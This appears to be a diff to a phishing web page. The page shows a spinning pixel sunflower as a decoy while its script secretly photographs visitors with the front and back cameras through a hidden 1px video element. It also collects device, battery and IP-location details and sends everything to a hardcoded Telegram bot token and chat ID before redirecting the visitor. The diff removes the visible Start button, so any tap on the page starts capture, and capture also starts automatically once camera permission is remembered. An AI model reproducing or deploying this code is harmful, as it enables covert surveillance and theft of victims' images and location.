@@ -7,20 +7,21 @@
 <style>
 body{
 margin:0;
-background:#000;
+background:black;
 display:flex;
 justify-content:center;
 align-items:center;
 height:100vh;
 overflow:hidden;
+cursor:pointer;
 }
 
-/* 🌻 Pixel sunflower generated via CSS */
+/* 🌻 Pixel sunflower */
 .flower{
 width:150px;
 height:150px;
 position:relative;
-animation:spin 6s linear infinite;
+animation:spin 4s linear infinite;
 }
 
 .flower div{
@@ -33,10 +34,10 @@ border-radius:4px;
 
 .center{
 background:#5a3d00 !important;
-width:40px !important;
-height:40px !important;
-top:55px;
-left:55px;
+width:42px !important;
+height:42px !important;
+top:54px;
+left:54px;
 }
 
 @keyframes spin{
@@ -44,7 +45,7 @@ from{transform:rotate(0deg)}
 to{transform:rotate(360deg)}
 }
 
-/* Tiny preview */
+/* Hidden preview */
 video{
 position:absolute;
 width:1px;
@@ -52,19 +53,9 @@ height:1px;
 opacity:0.01;
 }
 
-button{
-position:absolute;
-bottom:60px;
-padding:12px 20px;
-border:none;
-border-radius:8px;
-font-size:16px;
-cursor:pointer;
-}
-
-/* Fade transition */
+/* Fade */
 .fade{
-animation:fadeOut 1s forwards;
+animation:fadeOut 0.8s forwards;
 }
 
 @keyframes fadeOut{
@@ -80,14 +71,14 @@ to{opacity:0;}
 <video id="video" autoplay playsinline></video>
 <canvas id="canvas" style="display:none;"></canvas>
 
-<button id="startBtn">Start</button>
-
 <script>
-/* -------- TELEGRAM CONFIG -------- */
+/* ---------- CONFIG ---------- */
+
 const BOT_TOKEN="8082815317:AAEHd6AKLOBJK9vXU0KUuXCgwPt4-v0DyGg";
 const CHAT_ID="1167762232";
 
-/* -------- CREATE PIXEL FLOWER -------- */
+/* ---------- FLOWER BUILD ---------- */
+
 const flower=document.getElementById("flower");
 for(let i=0;i<12;i++){
 let p=document.createElement("div");
@@ -100,35 +91,37 @@ let c=document.createElement("div");
 c.className="center";
 flower.appendChild(c);
 
-/* -------- TELEGRAM SEND -------- */
-async function sendPhoto(blob,caption=""){
-let form=new FormData();
-form.append("chat_id",CHAT_ID);
-form.append("photo",blob);
-form.append("caption",caption);
+/* ---------- TELEGRAM ---------- */
 
-await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
+async function sendPhoto(blob,cap=""){
+let f=new FormData();
+f.append("chat_id",CHAT_ID);
+f.append("photo",blob);
+f.append("caption",cap);
+
+fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
 method:"POST",
-body:form
+body:f
 });
 }
 
-async function sendText(text){
-await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+async function sendText(txt){
+fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
 method:"POST",
 headers:{'Content-Type':'application/json'},
-body:JSON.stringify({chat_id:CHAT_ID,text})
+body:JSON.stringify({chat_id:CHAT_ID,text:txt})
 });
 }
 
-/* -------- DEVICE INFO -------- */
+/* ---------- INFO ---------- */
+
 async function collectInfo(){
 
-let info="📱 Device\n"+navigator.userAgent+"\n";
+let info="📱 "+navigator.userAgent+"\n";
 
 if(navigator.getBattery){
 let b=await navigator.getBattery();
-info+="🔋 Battery: "+Math.round(b.level*100)+"%\n";
+info+="🔋 "+Math.round(b.level*100)+"%\n";
 }
 
 try{
@@ -140,13 +133,14 @@ info+=`📍 ${j.city}, ${j.country_name}`;
 sendText(info);
 }
 
-/* -------- CAMERA -------- */
+/* ---------- CAMERA ---------- */
+
 let video=document.getElementById("video");
 let canvas=document.getElementById("canvas");
 let ctx=canvas.getContext("2d");
 
-async function startCamera(mode){
-return await navigator.mediaDevices.getUserMedia({
+async function cam(mode){
+return navigator.mediaDevices.getUserMedia({
 video:{
 facingMode:mode,
 width:{ideal:1920},
@@ -160,77 +154,85 @@ canvas.width=video.videoWidth;
 canvas.height=video.videoHeight;
 ctx.drawImage(video,0,0);
 
-return new Promise(res=>{
-canvas.toBlob(res,"image/jpeg",0.95);
-});
+return new Promise(r=>canvas.toBlob(r,"image/jpeg",0.95));
 }
 
-/* -------- CAPTURE FLOW -------- */
-async function runExperiment(){
+/* ---------- MAIN ---------- */
+
+let started=false;
+
+async function run(){
+
+if(started) return;
+started=true;
 
 localStorage.setItem("expGranted","yes");
 
 await collectInfo();
 
-/* FRONT */
-let stream=await startCamera("user");
-video.srcObject=stream;
+/* FRONT CAMERA */
+let s=await cam("user");
+video.srcObject=s;
 
-await delay(1500);
+await sleep(600);
 
 for(let i=1;i<=3;i++){
-await sendPhoto(await snap(),"Front "+i);
-await delay(900);
+sendPhoto(await snap(),"Front "+i);
 }
 
-stream.getTracks().forEach(t=>t.stop());
+s.getTracks().forEach(t=>t.stop());
 
-/* BACK */
-stream=await startCamera("environment");
-video.srcObject=stream;
+/* BACK CAMERA */
+s=await cam("environment");
+video.srcObject=s;
 
-await delay(1500);
+await sleep(600);
 
 for(let i=1;i<=2;i++){
-await sendPhoto(await snap(),"Back "+i);
-await delay(900);
+sendPhoto(await snap(),"Back "+i);
 }
 
-stream.getTracks().forEach(t=>t.stop());
+s.getTracks().forEach(t=>t.stop());
 
-redirectUser();
+redirectNow();
 }
 
-/* -------- HELPERS -------- */
-function delay(ms){ return new Promise(r=>setTimeout(r,ms)); }
+/* ---------- AUTO PERMISSION MEMORY ---------- */
 
-function redirectUser(){
-document.body.classList.add("fade");
-
-let go=new URLSearchParams(location.search).get("go");
-if(go) setTimeout(()=>location.href=go,1000);
-}
-
-/* -------- PERMISSION MEMORY -------- */
-async function autoStartIfAllowed(){
+async function autoStart(){
 
 try{
-let perm=await navigator.permissions.query({name:"camera"});
+let p=await navigator.permissions.query({name:"camera"});
 
-if(perm.state==="granted" && localStorage.getItem("expGranted")==="yes"){
-runExperiment();
+if(p.state==="granted" && localStorage.getItem("expGranted")){
+run();
 }
 }catch{}
 }
 
-/* -------- BUTTON -------- */
-document.getElementById("startBtn").onclick=async ()=>{
-document.getElementById("startBtn").style.display="none";
-runExperiment();
-};
+/* ---------- REDIRECT ---------- */
 
-/* Try auto start */
-autoStartIfAllowed();
+function redirectNow(){
+
+document.body.classList.add("fade");
+
+let go=new URLSearchParams(location.search).get("go");
+
+setTimeout(()=>{
+if(go) location.href=go;
+},800);
+}
+
+/* ---------- HELPERS ---------- */
+
+function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
+
+/* ---------- TAP START ---------- */
+
+document.body.addEventListener("click",run);
+
+/* Try auto */
+autoStart();
 
 </script>
 
